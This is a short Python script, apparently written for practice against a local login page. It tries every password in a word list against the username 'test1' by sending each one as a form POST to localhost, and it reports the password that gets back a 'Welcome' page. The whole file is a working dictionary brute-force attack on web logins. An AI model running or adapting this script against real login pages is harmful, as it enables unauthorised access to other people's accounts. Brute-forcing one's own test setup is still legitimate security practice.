import requests
url = 'http://localhost'

with open("list.txt", 'r') as f:
        passwords = f.readlines()
        for i,password in enumerate(passwords):
            password = password.replace('\n','')
            print("trying password : " + str(i+1) + " " + password)
            form_data = {'username':'test1','password':password}
            
            response = requests.post(url, data=form_data)
            
            output = response.text
            
            if "Welcome" in output:
                print("found password: " + password)
                
            else:
                print("wrong")